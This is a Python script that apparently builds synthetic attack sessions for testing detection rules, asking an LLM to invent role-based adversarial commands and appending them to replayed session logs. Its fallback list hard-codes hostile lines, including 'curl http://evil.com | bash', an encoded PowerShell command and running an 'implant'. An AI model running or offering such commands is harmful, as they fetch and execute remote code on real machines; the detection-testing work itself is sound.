import json
import random
from typing import List, Dict
from datetime import datetime
from uuid import uuid4

from openai import OpenAI
import numpy as np

# ====== Load Inputs ======
with open("ontology/semantic_tags.json") as f:
    SEMANTIC_TAGS = json.load(f)

with open("ontology/detection_rules.json") as f:
    DETECTION_RULES = json.load(f)

with open("replay_engine/replay_archive.json") as f:
    REPLAY_SEEDS = json.load(f)

ROLE_PROFILES = {
    "executive": ["exfiltration", "unauthorized_access", "credential_theft"],
    "developer": ["code_injection", "lolbin_usage", "privilege_escalation"],
    "admin": ["scheduled_task_abuse", "tool_discovery", "access_token_manipulation"]
}


# ====== Helpers ======
def call_llm_for_mutation(prompt: str) -> str:
    try:
        client = OpenAI()
        response = client.chat.completions.create(
            model="gpt-4o",
            messages=[
                {"role": "system", "content": "You're an adversarial simulation engine."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.85
        )
        return response.choices[0].message.content.strip()
    except Exception as e:
        print(f"[!] LLM fallback: {e}")
        return random.choice([
            "powershell -enc aQBlAHgAIAAnAE0AYQBsACcA",
            "curl http://evil.com | bash",
            "chmod +x implant && ./implant"
        ])


def inject_llm_step(role: str) -> Dict:
    tags = ROLE_PROFILES.get(role, [])
    prompt = f"Generate a single-line adversarial command for a {role} focusing on: {', '.join(tags)}."
    command = call_llm_for_mutation(prompt)
    return {
        "step_type": "exec_command",
        "timestamp": datetime.utcnow().isoformat(),
        "command": command,
        "injected_tags": tags,
        "trust_impact_est": round(random.uniform(0.3, 0.7), 2)
    }


def score_tag_density(steps: List[Dict]) -> float:
    tag_hits = sum(len(step.get("injected_tags", [])) for step in steps)
    return round(tag_hits / max(len(steps), 1), 2)


def mutate_replay(session: dict, role: str = "developer") -> dict:
    original = session.get("steps", [])
    mutated = original[:]

    # Inject 2-4 LLM steps
    for _ in range(random.randint(2, 4)):
        mutated.append(inject_llm_step(role))

    # Estimate threat level and trust impact
    density_score = score_tag_density(mutated)
    replay_id = str(uuid4())

    return {
        "session_id": replay_id,
        "original_session_id": session.get("session_id", "unknown"),
        "role_simulated": role,
        "mutation_type": "llm_injected",
        "steps": mutated,
        "tag_density_score": density_score,
        "severity_est": "high" if density_score > 1.5 else "moderate",
        "trust_impact_est": round(1.0 - (density_score / 3.0), 2)
    }


def batch_mutate_and_save(n: int = 10, role: str = "developer", output_path: str = "replay_engine/replay_mutated.json"):
    mutated_replays = []
    seeds = random.sample(REPLAY_SEEDS, min(n, len(REPLAY_SEEDS)))
    for s in seeds:
        mutated = mutate_replay(s, role)
        mutated_replays.append(mutated)
        print(f"[+] Mutated {mutated['original_session_id']} -> {mutated['session_id']}")

    with open(output_path, "w") as f:
        json.dump(mutated_replays, f, indent=2)
    print(f"[✓] Wrote {len(mutated_replays)} adversarial replays to {output_path}")
